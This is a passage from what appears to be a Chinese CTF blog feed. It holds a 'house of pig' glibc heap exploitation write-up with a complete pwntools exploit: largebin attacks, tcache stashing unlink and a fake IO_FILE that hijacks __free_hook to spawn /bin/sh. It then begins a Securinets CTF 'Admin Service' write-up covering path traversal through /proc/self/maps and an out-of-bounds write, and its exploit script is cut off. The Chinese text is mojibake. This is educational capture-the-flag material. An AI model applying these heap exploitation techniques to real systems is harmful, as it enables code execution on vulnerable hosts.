_IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">new_size=<span class="number">2</span> * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + <span class="number">100</span></span><br></pre></td></tr></table></figure><p>æ»¡è¶³</p><ul><li>fp-&gt;_flags&#x3D;0 </li><li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;&#x3D; _IO_buf_end - _IO_buf_base</li></ul><p>_è§¦å‘malloc (new_size) -&gt; memcpy (new_buf, old_buf, old_blen); -&gt; free (old_buf);æ§åˆ¶_IO_buf_endã€_IO_buf_baseå°±å¯ä»¥æ§åˆ¶mallocå¤§å°å’Œè¦å†™å…¥çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pig&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;message: &quot;</span>,(payload+<span class="string">b&#x27;\n&#x27;</span>)*(size//<span class="number">48</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;message: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">role</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">1</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;A\x01\x95\xc9\x1c&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">2</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;B\x01\x87\xc3\x19&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">3</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;C\x01\xf7\x3c\x32&quot;</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>,<span class="string">b&#x27;tcache size&#x27;</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)  <span class="comment"># B0~B4</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">b&#x27;tcache size\n&#x27;</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">b&#x27;tcache size\n&#x27;</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)<span class="comment"># A1~A7</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 0x150å¤§å°çš„A0æ”¾å…¥unsortedbin</span></span><br><span class="line">Del(<span class="number">0</span>)<span class="comment"># A0</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#åˆ‡å‰²A0ï¼Œå‰©ä½™çš„0xa0å¤§å°æ”¾å…¥unsorted</span></span><br><span class="line">Add(<span class="number">0xb0</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B5</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#0xa0å¤§å°è¿›å…¥smallbin</span></span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line"><span class="comment">#A8è¿›å…¥unsortedbind</span></span><br><span class="line">Del(<span class="number">8</span>)<span class="comment">#A8</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#åˆ‡å‰²A8ï¼Œunsortedbinè¿˜å‰©ä¸‹0xa0</span></span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>)<span class="comment"># B6</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#å‰©ä½™a0è¿›å…¥smallbin</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>)<span class="comment"># A16</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#é˜²æ­¢a16å’Œtopchunkåˆå¹¶  </span></span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">b&#x27;B\n&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B7</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#A16æ”¾å…¥unsortedbin</span></span><br><span class="line">Del(<span class="number">16</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#a16è¿›å…¥largebin</span></span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">b&#x27;B\n&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B8</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>))-<span class="number">0x1ecfe0</span></span><br><span class="line">free_hook = libc_base + libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libcelf.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;message is: &#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x13940</span></span><br><span class="line">p(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line"><span class="comment">#æ¢å¤A16çš„fdå’Œbk</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ecfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A17</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A19</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#B8 0x440è¿›å…¥unsortedbin</span></span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#B8 0x440è¿›å…¥largebin</span></span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B9</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#A17è¿›å…¥unsortedbin</span></span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#ä¿®æ”¹B8çš„fd_nextsizeå’Œbk_nextsize å› ä¸ºmompigçš„ç¼–è¾‘æ˜¯ä»0x10å¼€å§‹çš„</span></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#è§¦å‘largebin attachçš„victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;å³ free_hook-0x28+0x20å¤„å†™å…¥</span></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># C0</span></span><br><span class="line">b()</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#æ¢å¤ä¹‹å‰ç ´åçš„B8çš„fd_nextsizeå’Œbk_nextsize</span></span><br><span class="line">Edit(<span class="number">8</span>,<span class="number">2</span>*p64(heap_base + <span class="number">0x13e80</span>)+ <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attac</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#æ‹¿å‡ºä¸Šæ¬¡è§¦å‘largebin attachæ—¶ç”³è¯·0xa0åˆ‡å‰²åæ”¾å…¥unsortedbinçš„å †å—</span></span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)<span class="comment"># A19</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#,ç»§ç»­è§¦å‘largebinattach åœ¨IO_list_allå†™å…¥å †åœ°å€</span></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#æ¢å¤ä¹‹å‰ç ´åçš„B8çš„fd_nextsizeå’Œbk_nextsize</span></span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#åˆ©ç”¨uafä¿®æ”¹A8æ”¾å…¥smallbinçš„fdå’Œbk,ç¼–è¾‘çš„æ—¶å€™0x48å¤§å°åªèƒ½æ¥å—0x16æ•°æ®ï¼Œ0x50å¯ä»¥å†™0x48*(0x50//16)=0xf0å¤§å°ï¼Œå¯ä»¥è¦†ç›–åˆ°smallbiné‡Œçš„fd bk</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line"><span class="comment">#æŠŠå†™å…¥iolistallçš„å †åœ°å€ä»largebiné‡Œç”³è¯·å‡ºæ¥,å¹¶æŠŠFILEçš„chainæ”¹å†™ä¸ºsmallbinç¬¬ä¸€ä¸ª</span></span><br><span class="line">Add(<span class="number">0x440</span>, payload)<span class="comment">#C3</span></span><br><span class="line"><span class="comment">#è§¦å‘tcache_stashing_unlink_attackï¼Œå°†0xa0å¤§å°çš„free_hook-0x10é“¾å…¥tcacheä¸­</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b calloc&#x27;)</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># C4</span></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e9560</span></span><br><span class="line">system_addr = libc_base + libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>) <span class="comment">#fp-&gt;flag=0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line"><span class="comment">#æ»¡è¶³fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4 _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5 _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line"><span class="comment">#è¿™é‡Œçš„giftç”³è¯· calloc(1uLL, 0xE8uLL);ä¼šä»smallbiné‡ŒæŠŠä¹‹å‰å†™å…¥chainçš„å †å—æ‹¿å‡ºæ¥</span></span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">b()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ä¼ªé€ å®Œä¸”exitè¿”å›ä¹‹å‰</p><p><img src="/2023/08/12/house-of-pig/image-20230813173155790.png" alt="image-20230813173155790"></p><p><img src="/2023/08/12/house-of-pig/image-20230813173349353.png" alt="image-20230813173349353"></p><p><img src="/2023/08/12/house-of-pig/image-20230813173329624.png" alt="image-20230813173329624"></p><p>å½“é€€å‡ºæ—¶è§¦å‘exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow</p><p>ä¼šmalloc(2 * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + 100)&#x3D;malloc(0x94)ä¼šç”³è¯·åˆ°free hook-0x10</p><p>memcpyä¼šæŠŠsystemå†™å…¥free_hookï¼Œæœ€åè§¦å‘free (old_buf);è§¦å‘system(&#x2F;bin&#x2F;sh)</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/mozibai666/article/details/120121891">https://blog.csdn.net/mozibai666/article/details/120121891</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 Securinets CTF Quals</title>
      <link href="/2023/08/10/2023-securinets-ctf/"/>
      <url>/2023/08/10/2023-securinets-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Admin-Service"><a href="#Admin-Service" class="headerlink" title="Admin Service"></a>Admin Service</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/S/A/togive&gt; checksec ./services</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/Admin Service/togive/services&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;./&#x27;</span><br></pre></td></tr></table></figure><p>å¼€äº†æ²™ç®±</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/S/A/togive&gt; seccomp-tools dump ./services</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000039  if (A == fork) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x0000003a  if (A == vfork) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>readChatå¯ä»¥è·³å‡ºç›®å½•åˆ©ç”¨&#x2F;proc&#x2F;self&#x2F;mapsæ³„éœ²åŸºåœ°å€ï¼ŒupdateConfigå¯ä»¥æ— é™è¶Šç•Œå†™</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./services&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span 